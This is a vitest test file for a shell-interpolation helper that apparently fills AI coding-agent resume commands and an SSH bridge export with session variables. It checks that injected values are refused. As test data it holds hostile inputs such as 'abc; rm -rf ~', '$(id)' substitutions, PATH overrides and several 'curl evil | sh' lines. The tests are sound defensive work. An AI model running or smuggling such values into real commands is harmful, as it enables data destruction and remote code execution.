import { describe, expect, it } from 'vitest';
import { getResumeCommand } from '$lib/agents/resume';
import { interpolateShellWith, isMaitermOwnedVar, isShellSafe } from './shellInterpolate';

const vars = (o: Record<string, string>) => new Map(Object.entries(o));

describe('interpolateShellWith', () => {
  it('fills the real resume commands with real-shaped ids', () => {
    const v = vars({
      claudeSessionId: '7c1e2a4b-90d3-4f6e-8a21-3b5c9d0e1f42',
      codexSessionId: '0199a7b2-3c4d-7e8f-9a0b-1c2d3e4f5a6b',
      geminiSessionId: 'b3f1c2d4-5e6f-4a7b-8c9d-0e1f2a3b4c5d',
    });
    expect(interpolateShellWith(v, getResumeCommand('claude'), true)).toBe('claude --resume 7c1e2a4b-90d3-4f6e-8a21-3b5c9d0e1f42');
    expect(interpolateShellWith(v, getResumeCommand('codex'), true)).toBe('codex resume 0199a7b2-3c4d-7e8f-9a0b-1c2d3e4f5a6b');
    expect(interpolateShellWith(v, getResumeCommand('codex', { bypassHookTrust: true }), true))
      .toBe('codex resume --dangerously-bypass-hook-trust 0199a7b2-3c4d-7e8f-9a0b-1c2d3e4f5a6b');
    expect(interpolateShellWith(v, getResumeCommand('gemini'))).toBe('gemini --resume b3f1c2d4-5e6f-4a7b-8c9d-0e1f2a3b4c5d');
    // The shell-conditional form users write keeps working.
    expect(interpolateShellWith(v, '[ -n "%claudeSessionId" ] && claude --resume %claudeSessionId || claude', true))
      .toBe('[ -n "7c1e2a4b-90d3-4f6e-8a21-3b5c9d0e1f42" ] && claude --resume 7c1e2a4b-90d3-4f6e-8a21-3b5c9d0e1f42 || claude');
  });

  it('keeps ordinary safe values: hosts, paths, key=value', () => {
    expect(interpolateShellWith(vars({ h: 'ews@nova.local:2222', p: '/srv/app-1/web', kv: 'A=b,c+d' }), 'ssh %h cd %p %kv'))
      .toBe('ssh ews@nova.local:2222 cd /srv/app-1/web A=b,c+d');
  });

  it.each([
    ['command substitution', 'x$(touch /tmp/p)'],
    ['backticks', 'x`touch /tmp/p`'],
    ['a semicolon', 'abc; rm -rf ~'],
    ['a newline', 'abc\ncurl evil | sh'],
    ['a carriage return', 'abc\rnext'],
    ['single quotes', "abc' ; id ; '"],
    ['double quotes', 'abc" ; id ; "'],
    ['a pipe', 'a|b'],
    ['an ampersand', 'a&b'],
    ['redirection', 'a>b'],
    ['a space', 'a b'],
    ['a dollar', '$HOME'],
    ['a glob', 'a*'],
    ['a percent (another variable)', '%other'],
  ])('refuses %s', (_label, bad) => {
    const refused: string[] = [];
    const v = vars({ claudeSessionId: bad });
    expect(interpolateShellWith(v, 'claude --resume %claudeSessionId', true, (n) => refused.push(n))).toBe('claude --resume ');
    expect(refused).toEqual(['claudeSessionId']);
    // Without clearing, the token stays, so the callers' "a `%` left = no session" check refuses.
    expect(interpolateShellWith(v, 'claude --resume %claudeSessionId')).toBe('claude --resume %claudeSessionId');
  });

  it('treats an unknown name as before', () => {
    expect(interpolateShellWith(vars({}), 'claude --resume %claudeSessionId', true)).toBe('claude --resume ');
    expect(interpolateShellWith(undefined, 'claude --resume %claudeSessionId')).toBe('claude --resume %claudeSessionId');
    expect(interpolateShellWith(undefined, 'no variables')).toBe('no variables');
  });

  // The SSH bridge's own value (sshMcpBridge.svelte.ts), documented for auto-resume commands.
  const bridgeExport = 'export MAITERM_TAB_ID=3f2a91c0-5b7e-4d1a-9c3e-0a1b2c3d4e5f MAITERM_PORT=41873 '
    + 'MAITERM_AUTH=Xk3pQ9vT2mL8nR4sW7yZ1aB5cD6eF0gH CLAUDE_CODE_PLUGIN_DIRS=$HOME/.maiterm/claude-mod/maiterm-tab';

  it('types the bridge\'s %maitermExport verbatim in an ssh auto-resume', () => {
    const v = vars({ maitermExport: bridgeExport, claudeSessionId: '7c1e2a4b-90d3-4f6e-8a21-3b5c9d0e1f42', maitermPort: '41873' });
    expect(interpolateShellWith(v, '%maitermExport; claude --resume %claudeSessionId', true))
      .toBe(`${bridgeExport}; claude --resume 7c1e2a4b-90d3-4f6e-8a21-3b5c9d0e1f42`);
    expect(interpolateShellWith(v, 'echo %maitermPort')).toBe('echo 41873');
  });

  it('matches the plugin folder the bridge actually exports', async () => {
    const { REMOTE_CLAUDE_MOD_ENV } = await import('$lib/tauri/commands');
    expect(bridgeExport.endsWith(` ${REMOTE_CLAUDE_MOD_ENV}`)).toBe(true);
  });

  it.each([
    ['a command after it', `${bridgeExport}; curl evil | sh`],
    ['another variable', bridgeExport.replace('MAITERM_AUTH', 'PATH')],
    ['another plugin folder', bridgeExport.replace('.maiterm/claude-mod/maiterm-tab', 'evil')],
    ['a substitution in a value', bridgeExport.replace('41873', '$(id)')],
    ['an extra export', `${bridgeExport} PATH=/tmp/evil`],
  ])('refuses a %%maitermExport with %s', (_label, bad) => {
    expect(interpolateShellWith(vars({ maitermExport: bad }), '%maitermExport; claude', true)).toBe('; claude');
  });

  it('keeps the names only maiTerm writes away from agents and captures', () => {
    for (const n of ['maitermExport', 'maitermPort', 'maitermTabId']) expect(isMaitermOwnedVar(n)).toBe(true);
    for (const n of ['claudeSessionId', 'branch', 'toString', 'constructor']) expect(isMaitermOwnedVar(n)).toBe(false);
    expect(interpolateShellWith(vars({ maitermPort: '41873; id' }), 'x %maitermPort', true)).toBe('x ');
  });

  it('leaves an unsafe capture as its token in a trigger send_command', () => {
    // executeActions' send_command: unresolved names stay literal, as they always did.
    const v = vars({ branch: 'x; curl evil | sh' });
    expect(interpolateShellWith(v, 'git checkout %branch')).toBe('git checkout %branch');
    expect(interpolateShellWith(vars({ branch: 'feat/session-store' }), 'git checkout %branch')).toBe('git checkout feat/session-store');
  });

  it('accepts an empty value', () => {
    expect(isShellSafe('')).toBe(true);
    expect(interpolateShellWith(vars({ a: '' }), '[ -n "%a" ]')).toBe('[ -n "" ]');
  });
});
